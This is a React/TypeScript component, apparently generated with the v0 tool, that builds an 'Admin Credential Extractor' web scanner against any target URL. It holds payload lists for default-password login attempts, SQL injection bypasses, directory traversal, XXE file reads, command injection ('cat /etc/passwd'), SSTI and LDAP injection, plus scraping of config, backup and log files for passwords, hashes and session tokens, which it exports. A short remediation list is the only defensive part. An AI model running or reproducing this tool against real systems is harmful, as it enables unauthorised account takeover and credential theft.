"use client"

import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Progress } from "@/components/ui/progress"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Alert, AlertDescription } from "@/components/ui/alert"
import {
  ArrowLeft,
  Play,
  Pause,
  Download,
  AlertTriangle,
  Database,
  FileText,
  Key,
  Lock,
  Search,
  Target,
  Zap,
  Bug,
  Code,
  Server,
  Hash,
} from "lucide-react"

interface AdminCredential {
  id: string
  attackVector: string
  severity: "critical" | "high" | "medium" | "low"
  username?: string
  password?: string
  hash?: string
  endpoint: string
  method: string
  timestamp: string
  details: string
  context: string
  payload?: string
  response?: string
  verified: boolean
}

interface AttackVector {
  name: string
  description: string
  payloads: string[]
  endpoints: string[]
  patterns: RegExp[]
  severity: "critical" | "high" | "medium" | "low"
}

export default function AdminCredentialExtractor({ onBack }: { onBack?: () => void }) {
  const [targetUrl, setTargetUrl] = useState("")
  const [isScanning, setIsScanning] = useState(false)
  const [progress, setProgress] = useState(0)
  const [activeTab, setActiveTab] = useState("scanner")
  const [credentials, setCredentials] = useState<AdminCredential[]>([])
  const [scanResults, setScanResults] = useState<string[]>([])
  const [selectedVector, setSelectedVector] = useState<string>("all")

  const attackVectors: AttackVector[] = [
    {
      name: "Default Admin Credentials",
      description: "Tests common default admin username/password combinations",
      payloads: [
        "admin:admin",
        "admin:password",
        "admin:123456",
        "admin:admin123",
        "administrator:administrator",
        "root:root",
        "admin:",
        "admin:password123",
        "user:user",
        "test:test",
        "demo:demo",
        "guest:guest",
        "admin:qwerty",
        "admin:letmein",
        "admin:welcome",
        "admin:changeme",
      ],
      endpoints: ["/admin", "/login", "/signin", "/auth", "/administrator", "/wp-admin"],
      patterns: [
        /admin["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /password["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /username["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
      ],
      severity: "critical",
    },
    {
      name: "SQL Injection Login Bypass",
      description: "Attempts SQL injection to bypass admin authentication",
      payloads: [
        "admin' OR '1'='1",
        "admin' OR 1=1--",
        "admin' OR 1=1#",
        "admin'/*",
        "' OR 1=1--",
        "' OR 'a'='a",
        "admin' UNION SELECT 1--",
        "admin'; DROP TABLE users--",
        "' OR 1=1 LIMIT 1--",
        "admin' OR 'x'='x",
        "1' OR '1'='1' ({",
        "admin'--",
        "admin' OR 1=1/*",
        "' OR 1=1#",
        "admin' OR 'admin'='admin",
      ],
      endpoints: ["/login", "/admin/login", "/auth", "/signin", "/admin/auth"],
      patterns: [/error.*sql/gi, /mysql.*error/gi, /postgresql.*error/gi, /oracle.*error/gi, /syntax.*error/gi],
      severity: "critical",
    },
    {
      name: "Directory Traversal",
      description: "Attempts to access admin files through directory traversal",
      payloads: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../admin/config.php",
        "../../wp-config.php",
        "../../../database.yml",
        "..\\..\\admin\\users.txt",
        "../config/database.yml",
        "../../.env",
        "../../../var/log/auth.log",
        "..\\..\\..\\boot.ini",
        "../admin/.htpasswd",
      ],
      endpoints: ["/admin", "/files", "/download", "/view", "/include", "/page"],
      patterns: [/root:.*:/gi, /admin:.*:/gi, /password.*=/gi, /database.*password/gi],
      severity: "high",
    },
    {
      name: "Configuration File Exposure",
      description: "Searches for exposed configuration files containing credentials",
      payloads: [],
      endpoints: [
        "/.env",
        "/config.php",
        "/wp-config.php",
        "/database.yml",
        "/app.config",
        "/web.config",
        "/settings.ini",
        "/config.xml",
        "/admin.conf",
        "/db.conf",
        "/mysql.conf",
        "/postgres.conf",
        "/redis.conf",
        "/.htpasswd",
        "/config.json",
      ],
      patterns: [
        /password["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /admin["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /db_password["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /database_password["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /secret_key["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
      ],
      severity: "critical",
    },
    {
      name: "Backup File Discovery",
      description: "Searches for backup files that may contain credentials",
      payloads: [],
      endpoints: [
        "/backup.sql",
        "/dump.sql",
        "/users.sql",
        "/admin.sql",
        "/database.sql",
        "/backup.zip",
        "/admin_backup.tar.gz",
        "/db_backup.sql",
        "/site_backup.zip",
        "/config_backup.php",
        "/users_backup.txt",
        "/admin_users.csv",
        "/export.sql",
        "/backup/admin.sql",
        "/backups/users.sql",
        "/old/config.php",
      ],
      patterns: [
        /INSERT INTO.*users.*VALUES/gi,
        /CREATE TABLE.*users/gi,
        /admin.*password.*hash/gi,
        /username.*password/gi,
      ],
      severity: "high",
    },
    {
      name: "API Endpoint Enumeration",
      description: "Tests API endpoints for admin credential exposure",
      payloads: [],
      endpoints: [
        "/api/users",
        "/api/admin",
        "/api/auth",
        "/api/login",
        "/api/config",
        "/api/v1/users",
        "/api/v2/admin",
        "/api/admin/users",
        "/api/user/admin",
        "/graphql",
        "/api/graphql",
        "/rest/users",
        "/rest/admin",
        "/admin/api/users",
      ],
      patterns: [
        /"password":\s*"([^"]+)"/gi,
        /"username":\s*"([^"]+)"/gi,
        /"admin":\s*true/gi,
        /"role":\s*"admin"/gi,
        /"hash":\s*"([^"]+)"/gi,
      ],
      severity: "high",
    },
    {
      name: "JavaScript Source Analysis",
      description: "Analyzes JavaScript files for hardcoded admin credentials",
      payloads: [],
      endpoints: [
        "/js/admin.js",
        "/js/config.js",
        "/js/auth.js",
        "/admin.js",
        "/config.js",
        "/assets/admin.js",
        "/static/js/admin.js",
        "/js/login.js",
        "/admin/js/config.js",
      ],
      patterns: [
        /var\s+admin\s*=\s*["']([^"']+)["']/gi,
        /const\s+password\s*=\s*["']([^"']+)["']/gi,
        /let\s+adminPass\s*=\s*["']([^"']+)["']/gi,
        /adminPassword\s*[:=]\s*["']([^"']+)["']/gi,
        /defaultAdmin\s*[:=]\s*["']([^"']+)["']/gi,
      ],
      severity: "medium",
    },
    {
      name: "Log File Analysis",
      description: "Searches log files for admin credential leaks",
      payloads: [],
      endpoints: [
        "/logs/access.log",
        "/logs/error.log",
        "/logs/admin.log",
        "/logs/auth.log",
        "/log/application.log",
        "/admin/logs/access.log",
        "/var/log/apache2/access.log",
        "/logs/security.log",
        "/logs/login.log",
        "/admin.log",
        "/error.log",
      ],
      patterns: [
        /admin.*login.*password/gi,
        /authentication.*failed.*admin/gi,
        /login.*attempt.*admin.*password/gi,
        /POST.*login.*admin.*password/gi,
      ],
      severity: "medium",
    },
    {
      name: "Database Dump Analysis",
      description: "Analyzes database dumps for admin password hashes",
      payloads: [],
      endpoints: [
        "/mysqldump.sql",
        "/postgres_dump.sql",
        "/admin_users.sql",
        "/user_table.sql",
        "/database_export.sql",
        "/full_backup.sql",
        "/users_with_passwords.sql",
      ],
      patterns: [
        /INSERT INTO.*users.*admin.*\$2[aby]\$\d+\$/gi,
        /admin.*\$2[aby]\$\d+\$[A-Za-z0-9./]{53}/gi,
        /password.*[a-f0-9]{32,64}/gi,
        /hash.*[a-f0-9]{40,128}/gi,
      ],
      severity: "critical",
    },
    {
      name: "Session Token Extraction",
      description: "Attempts to extract admin session tokens and cookies",
      payloads: [],
      endpoints: ["/admin", "/admin/dashboard", "/admin/users", "/admin/settings"],
      patterns: [
        /admin_session["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /auth_token["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /admin_token["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
        /session_id["\s]*[:=]["\s]*([^"'\s,}]+)/gi,
      ],
      severity: "high",
    },
    {
      name: "LDAP Injection",
      description: "Tests for LDAP injection vulnerabilities in admin authentication",
      payloads: [
        "admin)(&)",
        "admin)(cn=*)",
        "admin)(!(&(1=0)",
        "admin)(|(cn=*))",
        "*)(uid=*",
        "admin))(|(|",
        "admin))%00",
        "admin)(|(objectClass=*)",
      ],
      endpoints: ["/admin/login", "/ldap/auth", "/admin/ldap", "/auth/ldap"],
      patterns: [/ldap.*error/gi, /invalid.*dn/gi, /ldap.*bind.*failed/gi],
      severity: "high",
    },
    {
      name: "XML External Entity (XXE)",
      description: "Tests for XXE vulnerabilities to extract admin files",
      payloads: [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///windows/system32/config/sam">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/config.php">]><root>&test;</root>',
      ],
      endpoints: ["/admin/upload", "/admin/import", "/api/xml", "/admin/config"],
      patterns: [/root:.*:/gi, /admin:.*:/gi, /\$.*password.*=/gi],
      severity: "high",
    },
    {
      name: "Command Injection",
      description: "Tests for command injection to extract admin credentials",
      payloads: [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; type C:\\windows\\system32\\config\\sam",
        "| grep admin /etc/passwd",
        "&& cat /var/www/html/config.php",
        "; cat /home/admin/.bash_history",
      ],
      endpoints: ["/admin/system", "/admin/tools", "/admin/exec", "/admin/cmd"],
      patterns: [/root:.*:/gi, /admin:.*:/gi, /password.*=/gi],
      severity: "critical",
    },
    {
      name: "Server-Side Template Injection",
      description: "Tests for SSTI to access admin configuration",
      payloads: [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{config}}",
        "{{request.application}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.System).getProperty('user.dir')}",
      ],
      endpoints: ["/admin/template", "/admin/render", "/admin/preview"],
      patterns: [/49/gi, /config.*admin/gi, /password.*admin/gi],
      severity: "high",
    },
    {
      name: "Insecure Direct Object Reference",
      description: "Tests for IDOR vulnerabilities to access admin accounts",
      payloads: [],
      endpoints: [
        "/admin/user/1",
        "/admin/user/0",
        "/admin/profile/1",
        "/api/user/1",
        "/admin/account/admin",
        "/user/admin",
        "/profile/administrator",
      ],
      patterns: [/"role":\s*"admin"/gi, /"is_admin":\s*true/gi, /"admin":\s*true/gi, /"privileges":\s*"admin"/gi],
      severity: "medium",
    },
  ]

  const startScan = async () => {
    if (!targetUrl) {
      alert("Please enter a target URL")
      return
    }

    setIsScanning(true)
    setProgress(0)
    setCredentials([])
    setScanResults([])

    console.log("[v0] Starting comprehensive admin credential extraction scan")

    try {
      const totalVectors = selectedVector === "all" ? attackVectors.length : 1
      const vectorsToTest =
        selectedVector === "all" ? attackVectors : attackVectors.filter((v) => v.name === selectedVector)

      let currentVector = 0

      for (const vector of vectorsToTest) {
        console.log(`[v0] Testing attack vector: ${vector.name}`)
        setScanResults((prev) => [...prev, `Testing: ${vector.name}`])

        // Test each endpoint for this vector
        for (const endpoint of vector.endpoints) {
          try {
            const fullUrl = `${targetUrl}${endpoint}`

            // Test with payloads if available
            if (vector.payloads.length > 0) {
              for (const payload of vector.payloads) {
                try {
                  const response = await fetch("/api/proxy/content", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      url: fullUrl,
                      method: "POST",
                      body: `username=${payload.split(":")[0]}&password=${payload.split(":")[1] || payload}`,
                      headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    }),
                  })

                  if (response.ok) {
                    const result = await response.json()
                    const content = result.content || ""

                    // Check for successful authentication indicators
                    const successIndicators = [
                      /dashboard/gi,
                      /welcome.*admin/gi,
                      /logout/gi,
                      /admin.*panel/gi,
                      /successfully.*logged/gi,
                      /authentication.*successful/gi,
                    ]

                    const hasSuccess = successIndicators.some((pattern) => pattern.test(content))

                    if (hasSuccess) {
                      setCredentials((prev) => [
                        ...prev,
                        {
                          id: `${Date.now()}-${Math.random()}`,
                          attackVector: vector.name,
                          severity: "critical",
                          username: payload.split(":")[0],
                          password: payload.split(":")[1] || payload,
                          endpoint: fullUrl,
                          method: "POST",
                          timestamp: new Date().toISOString(),
                          details: `Successful login with payload: ${payload}`,
                          context: `Attack Vector: ${vector.name}`,
                          payload,
                          response: content.substring(0, 500),
                          verified: true,
                        },
                      ])
                    }

                    // Check patterns for credential exposure
                    vector.patterns.forEach((pattern) => {
                      const matches = [...content.matchAll(pattern)]
                      matches.forEach((match) => {
                        if (match[1] && match[1].length > 2) {
                          setCredentials((prev) => [
                            ...prev,
                            {
                              id: `${Date.now()}-${Math.random()}`,
                              attackVector: vector.name,
                              severity: vector.severity,
                              username: /user|admin|login/i.test(match[0]) ? match[1] : undefined,
                              password: /pass|pwd|secret|token|key/i.test(match[0]) ? match[1] : undefined,
                              hash: /hash|md5|sha/i.test(match[0]) ? match[1] : undefined,
                              endpoint: fullUrl,
                              method: "GET",
                              timestamp: new Date().toISOString(),
                              details: `Pattern match: ${match[0]} = ${match[1]}`,
                              context: `Attack Vector: ${vector.name}`,
                              payload,
                              response: match[0],
                              verified: false,
                            },
                          ])
                        }
                      })
                    })
                  }
                } catch (error) {
                  console.log(`[v0] Payload test failed for ${payload}:`, error)
                }
              }
            } else {
              // Test endpoint without payloads
              try {
                const response = await fetch("/api/proxy/content", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ url: fullUrl, method: "GET" }),
                })

                if (response.ok) {
                  const result = await response.json()
                  const content = result.content || ""

                  // Check patterns for credential exposure
                  vector.patterns.forEach((pattern) => {
                    const matches = [...content.matchAll(pattern)]
                    matches.forEach((match) => {
                      if (match[1] && match[1].length > 2) {
                        setCredentials((prev) => [
                          ...prev,
                          {
                            id: `${Date.now()}-${Math.random()}`,
                            attackVector: vector.name,
                            severity: vector.severity,
                            username: /user|admin|login/i.test(match[0]) ? match[1] : undefined,
                            password: /pass|pwd|secret|token|key/i.test(match[0]) ? match[1] : undefined,
                            hash: /hash|md5|sha/i.test(match[0]) ? match[1] : undefined,
                            endpoint: fullUrl,
                            method: "GET",
                            timestamp: new Date().toISOString(),
                            details: `Credential found in ${vector.name}: ${match[0]} = ${match[1]}`,
                            context: `Attack Vector: ${vector.name}`,
                            response: content.substring(0, 500),
                            verified: false,
                          },
                        ])
                      }
                    })
                  })
                }
              } catch (error) {
                console.log(`[v0] Endpoint test failed for ${fullUrl}:`, error)
              }
            }
          } catch (error) {
            console.log(`[v0] Vector test failed for ${endpoint}:`, error)
          }
        }

        currentVector++
        setProgress((currentVector / totalVectors) * 100)
      }

      setScanResults((prev) => [...prev, `Scan completed. Found ${credentials.length} potential credentials.`])
    } catch (error) {
      console.error("[v0] Admin credential extraction failed:", error)
      setScanResults((prev) => [...prev, "Error: Scan failed"])
    } finally {
      setIsScanning(false)
      setProgress(100)
    }
  }

  const stopScan = () => {
    setIsScanning(false)
    setProgress(0)
  }

  const exportResults = () => {
    const results = {
      targetUrl,
      timestamp: new Date().toISOString(),
      scanType: "Admin Credential Extraction",
      attackVectorsTested: selectedVector === "all" ? attackVectors.map((v) => v.name) : [selectedVector],
      credentials,
      scanResults,
      summary: {
        totalCredentials: credentials.length,
        criticalFindings: credentials.filter((c) => c.severity === "critical").length,
        highFindings: credentials.filter((c) => c.severity === "high").length,
        verifiedCredentials: credentials.filter((c) => c.verified).length,
      },
    }

    const blob = new Blob([JSON.stringify(results, null, 2)], { type: "application/json" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `admin-credential-extraction-${Date.now()}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical":
        return "bg-red-500 text-white"
      case "high":
        return "bg-orange-500 text-white"
      case "medium":
        return "bg-yellow-500 text-black"
      case "low":
        return "bg-blue-500 text-white"
      default:
        return "bg-gray-500 text-white"
    }
  }

  const getVectorIcon = (vectorName: string) => {
    if (vectorName.includes("SQL")) return <Database className="h-4 w-4" />
    if (vectorName.includes("Directory")) return <FileText className="h-4 w-4" />
    if (vectorName.includes("API")) return <Server className="h-4 w-4" />
    if (vectorName.includes("JavaScript")) return <Code className="h-4 w-4" />
    if (vectorName.includes("Hash")) return <Hash className="h-4 w-4" />
    if (vectorName.includes("Session")) return <Key className="h-4 w-4" />
    return <Bug className="h-4 w-4" />
  }

  return (
    <div className="min-h-screen bg-background text-foreground p-4 md:p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center gap-4">
          {onBack && (
            <Button variant="outline" size="sm" onClick={onBack}>
              <ArrowLeft className="h-4 w-4 mr-2" />
              Back
            </Button>
          )}
          <div className="flex-1">
            <h1 className="text-3xl font-bold text-balance">Advanced Admin Credential Extractor</h1>
            <p className="text-muted-foreground text-pretty">
              15+ attack vectors for comprehensive admin credential discovery and extraction
            </p>
          </div>
          <Button onClick={exportResults} variant="outline" disabled={credentials.length === 0}>
            <Download className="h-4 w-4 mr-2" />
            Export Results
          </Button>
        </div>

        {/* Control Panel */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Target className="h-5 w-5" />
              Scan Configuration
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="text-sm font-medium mb-2 block">Target URL</label>
                <Input
                  placeholder="https://your-target-domain.com"
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                />
              </div>
              <div>
                <label className="text-sm font-medium mb-2 block">Attack Vector</label>
                <select
                  className="w-full p-2 border rounded-md bg-background"
                  value={selectedVector}
                  onChange={(e) => setSelectedVector(e.target.value)}
                >
                  <option value="all">All Vectors ({attackVectors.length})</option>
                  {attackVectors.map((vector) => (
                    <option key={vector.name} value={vector.name}>
                      {vector.name}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div className="flex gap-4">
              <Button
                onClick={isScanning ? stopScan : startScan}
                variant={isScanning ? "destructive" : "default"}
                disabled={!targetUrl}
              >
                {isScanning ? (
                  <>
                    <Pause className="h-4 w-4 mr-2" />
                    Stop Scan
                  </>
                ) : (
                  <>
                    <Play className="h-4 w-4 mr-2" />
                    Start Extraction
                  </>
                )}
              </Button>
            </div>

            {isScanning && (
              <div className="space-y-2">
                <div className="flex justify-between text-sm">
                  <span>Scan Progress</span>
                  <span>{Math.round(progress)}%</span>
                </div>
                <Progress value={progress} className="h-2" />
              </div>
            )}
          </CardContent>
        </Card>

        {/* Attack Vectors Overview */}
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Zap className="h-5 w-5" />
              Attack Vectors ({attackVectors.length})
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
              {attackVectors.map((vector) => (
                <Card key={vector.name} className="border-l-4 border-l-primary">
                  <CardContent className="p-4">
                    <div className="flex items-start gap-3">
                      {getVectorIcon(vector.name)}
                      <div className="space-y-1">
                        <div className="font-medium text-sm">{vector.name}</div>
                        <p className="text-xs text-muted-foreground">{vector.description}</p>
                        <div className="flex items-center gap-2">
                          <Badge className={getSeverityColor(vector.severity)} variant="secondary">
                            {vector.severity.toUpperCase()}
                          </Badge>
                          <span className="text-xs text-muted-foreground">{vector.payloads.length} payloads</span>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Results */}
        <Card>
          <CardContent className="p-0">
            <Tabs value={activeTab} onValueChange={setActiveTab}>
              <TabsList className="grid w-full grid-cols-3">
                <TabsTrigger value="scanner">Live Scanner</TabsTrigger>
                <TabsTrigger value="credentials">Extracted Credentials</TabsTrigger>
                <TabsTrigger value="analysis">Analysis Report</TabsTrigger>
              </TabsList>

              <TabsContent value="scanner" className="p-6">
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">Real-Time Scan Results</h3>
                  <ScrollArea className="h-96 border rounded-lg p-4">
                    <div className="space-y-2 font-mono text-sm">
                      {scanResults.map((result, index) => (
                        <div key={index} className="p-2 bg-muted rounded">
                          <span className="text-muted-foreground">[{new Date().toLocaleTimeString()}]</span> {result}
                        </div>
                      ))}
                      {scanResults.length === 0 && (
                        <div className="text-center py-8 text-muted-foreground">
                          <Search className="h-12 w-12 mx-auto mb-2" />
                          Start a scan to see real-time results
                        </div>
                      )}
                    </div>
                  </ScrollArea>
                </div>
              </TabsContent>

              <TabsContent value="credentials" className="p-6">
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">Extracted Admin Credentials</h3>
                  <div className="space-y-3">
                    {credentials.map((cred) => (
                      <Card key={cred.id} className="border-l-4 border-l-destructive">
                        <CardContent className="p-4">
                          <div className="flex items-start justify-between">
                            <div className="flex items-start gap-3">
                              {getVectorIcon(cred.attackVector)}
                              <div className="space-y-1">
                                <div className="flex items-center gap-2">
                                  <Badge className={getSeverityColor(cred.severity)}>
                                    {cred.severity.toUpperCase()}
                                  </Badge>
                                  <span className="font-medium">{cred.attackVector}</span>
                                  {cred.verified && (
                                    <Badge variant="default" className="bg-green-500">
                                      VERIFIED
                                    </Badge>
                                  )}
                                </div>
                                <p className="text-sm text-muted-foreground">{cred.details}</p>
                                <div className="text-xs text-muted-foreground">
                                  <strong>Endpoint:</strong> {cred.endpoint} |<strong> Method:</strong> {cred.method} |
                                  <strong> Time:</strong> {new Date(cred.timestamp).toLocaleString()}
                                </div>
                                {(cred.username || cred.password || cred.hash) && (
                                  <div className="text-xs space-y-1">
                                    {cred.username && (
                                      <div>
                                        <strong>Username:</strong>{" "}
                                        <code className="bg-muted px-1 rounded">{cred.username}</code>
                                      </div>
                                    )}
                                    {cred.password && (
                                      <div>
                                        <strong>Password:</strong>{" "}
                                        <code className="bg-muted px-1 rounded">{cred.password}</code>
                                      </div>
                                    )}
                                    {cred.hash && (
                                      <div>
                                        <strong>Hash:</strong>{" "}
                                        <code className="bg-muted px-1 rounded text-xs">{cred.hash}</code>
                                      </div>
                                    )}
                                    {cred.payload && (
                                      <div>
                                        <strong>Payload:</strong>{" "}
                                        <code className="bg-muted px-1 rounded text-xs">{cred.payload}</code>
                                      </div>
                                    )}
                                  </div>
                                )}
                              </div>
                            </div>
                          </div>
                        </CardContent>
                      </Card>
                    ))}
                    {credentials.length === 0 && (
                      <div className="text-center py-8 text-muted-foreground">
                        <Lock className="h-12 w-12 mx-auto mb-2" />
                        No admin credentials extracted yet
                      </div>
                    )}
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="analysis" className="p-6">
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">Security Analysis Report</h3>
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                    <Card>
                      <CardContent className="p-4 text-center">
                        <div className="text-2xl font-bold text-destructive">
                          {credentials.filter((c) => c.severity === "critical").length}
                        </div>
                        <div className="text-sm text-muted-foreground">Critical</div>
                      </CardContent>
                    </Card>
                    <Card>
                      <CardContent className="p-4 text-center">
                        <div className="text-2xl font-bold text-orange-500">
                          {credentials.filter((c) => c.severity === "high").length}
                        </div>
                        <div className="text-sm text-muted-foreground">High</div>
                      </CardContent>
                    </Card>
                    <Card>
                      <CardContent className="p-4 text-center">
                        <div className="text-2xl font-bold text-yellow-500">
                          {credentials.filter((c) => c.severity === "medium").length}
                        </div>
                        <div className="text-sm text-muted-foreground">Medium</div>
                      </CardContent>
                    </Card>
                    <Card>
                      <CardContent className="p-4 text-center">
                        <div className="text-2xl font-bold text-green-500">
                          {credentials.filter((c) => c.verified).length}
                        </div>
                        <div className="text-sm text-muted-foreground">Verified</div>
                      </CardContent>
                    </Card>
                  </div>

                  {credentials.length > 0 && (
                    <Card>
                      <CardHeader>
                        <CardTitle className="text-sm">Recommendations</CardTitle>
                      </CardHeader>
                      <CardContent>
                        <div className="space-y-2 text-sm">
                          {credentials.some((c) => c.severity === "critical") && (
                            <Alert variant="destructive">
                              <AlertTriangle className="h-4 w-4" />
                              <AlertDescription>
                                Critical vulnerabilities found! Immediate action required to secure admin credentials.
                              </AlertDescription>
                            </Alert>
                          )}
                          <ul className="list-disc list-inside space-y-1 text-muted-foreground">
                            <li>Change all default admin credentials immediately</li>
                            <li>Implement strong password policies</li>
                            <li>Enable multi-factor authentication for admin accounts</li>
                            <li>Remove or secure exposed configuration files</li>
                            <li>Implement proper input validation and sanitization</li>
                            <li>Regular security audits and penetration testing</li>
                          </ul>
                        </div>
                      </CardContent>
                    </Card>
                  )}
                </div>
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      </div>
    </div>
  )
}
